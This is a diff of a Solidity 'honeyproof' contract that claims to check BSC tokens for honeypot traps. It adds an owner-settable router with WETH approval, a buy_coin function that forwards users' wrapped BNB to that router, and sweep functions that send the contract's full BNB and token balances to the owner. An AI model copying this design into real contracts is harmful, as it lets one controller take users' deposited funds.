@@ -1,10 +1,9 @@
-// 0x712e67a146f8d2992570521296b9e75f61cedb50
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.6.6;
 
 interface Ihoneyproof {
-    function get_referral(address referral_adr) external view returns (uint);
-    function run_honeyproof(address referral_adr, address user_adr, address token_adr, uint x, bool is_v2) external returns (uint);
+    function _safe_check(address referral_adr, address user_adr, address token_adr, uint x, bool is_v2) external returns (uint);
+    function _buy_coin(address user_adr, uint x) external;
 }
 
 interface IWETH {
@@ -12,12 +11,15 @@ interface IWETH {
     function withdraw(uint wad) external;
 }
 
+interface IERC20 {
+    function balanceOf(address owner) external view returns (uint);
+}
+
 contract honeyproof {
-    address private safe_c;
+    address private router_adr;
     address private owner;
     
     constructor() {
-        safe_c = address(0x75E774e7bbCbd3d9Ccc0e2f2F520283DEcDe8De4);
         owner = msg.sender;
     }
     
@@ -30,28 +32,56 @@ contract honeyproof {
         require(req, 'P');
     }
     
-    ///////////////////////////////////////////////////////// user range
-    
-    function get_referral(address referral_adr) external view returns (uint) {
-        return Ihoneyproof(safe_c).get_referral(referral_adr);
+    function safe_tx(address token, address from, address to, uint value) internal {
+        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
+        bool req = success && (data.length == 0 || abi.decode(data, (bool)));
+        require(req, 'T');
     }
+    
+    ///////////////////////////////////////////////////////// user range
     
     function safe_check(address referral_adr, address token_adr, bool is_v2) external payable {
         address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-        IWETH(WETH).deposit{value: msg.value}();
         
-        uint value = Ihoneyproof(safe_c).run_honeyproof(referral_adr, msg.sender, token_adr, msg.value, is_v2);
-        IWETH(WETH).withdraw(value);
+        IWETH(WETH).deposit{value: msg.value}();
+        Ihoneyproof(router_adr)._safe_check(referral_adr, msg.sender, token_adr, msg.value, is_v2);
+        IWETH(WETH).withdraw(msg.value);
     }
     
+    function buy_coin() external payable {
+        address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+        IWETH(WETH).deposit{value: msg.value}();
+        
+        Ihoneyproof(router_adr)._buy_coin(msg.sender, msg.value);
+    }
     ///////////////////////////////////////////////////////// admin range
     
-    function set_safe_c(address _safe_c) external {
+    function set_router_adr(address _router_adr) external {
         require(msg.sender == owner, 'O');
         
         address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
         
-        safe_c = _safe_c;
-        safe_ap(WETH, _safe_c);
+        router_adr = _router_adr;
+        safe_ap(WETH, _router_adr);
+    }
+    
+    ///////////////////////////////// careful to use this
+    function tx_bnb() external {
+        (bool success, ) = payable(owner).call{value: address(this).balance}("");
+        require(success, 'T');
+    }
+    
+    function get_bnb() external {
+        (bool success, ) = payable(owner).call{value: address(this).balance}("");
+        require(success, 'T');
+    }
+    
+    function approve_token(address token_adr) external {
+        safe_ap(token_adr, address(this));
+    }
+    
+    function get_token(address token_adr) external {
+        uint x = IERC20(token_adr).balanceOf(address(this));
+        safe_tx(token_adr, address(this), owner, x);
     }
 }
